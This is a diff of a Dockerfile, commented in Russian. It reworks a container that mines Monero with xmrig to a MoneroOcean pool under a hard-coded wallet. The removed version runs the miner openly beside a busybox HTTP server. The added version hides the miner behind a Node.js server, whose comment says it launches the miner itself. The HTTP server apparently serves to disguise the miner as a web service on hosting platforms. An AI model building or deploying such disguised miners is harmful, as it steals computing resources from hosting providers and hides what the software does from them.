@@ -1,10 +1,20 @@
-FROM boredmates/moneroocean-xmrig-docker:latest
+# Берём бинарник xmrig из готового образа
+FROM boredmates/moneroocean-xmrig-docker:latest AS xmrig
 
-# Устанавливаем busybox-extras (httpd)
-RUN apk add --no-cache busybox-extras
+# Легковесный образ с Node.js
+FROM node:20-alpine
 
-# Переопределяем ENTRYPOINT на оболочку
-ENTRYPOINT ["sh"]
+# Копируем бинарник xmrig и библиотеки
+COPY --from=xmrig /bin/xmrig /usr/local/bin/xmrig
+COPY --from=xmrig /bin/default_config.json /bin/default_config.json
 
-# Запускаем HTTP-сервер в фоне и майнер
-CMD ["-c", "busybox httpd -p $PORT -h /tmp -f & xmrig -o gulf.moneroocean.stream:10004 -u 48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36 -p x -k -t 2"]
+# Устанавливаем зависимости для xmrig (hwloc, libuv)
+RUN apk add --no-cache libuv-dev hwloc-dev
+
+WORKDIR /app
+
+# Создаём минимальный HTTP-сервер
+COPY server.js .
+
+# Запускаем сервер (он сам запустит майнер)
+CMD ["node", "server.js"]
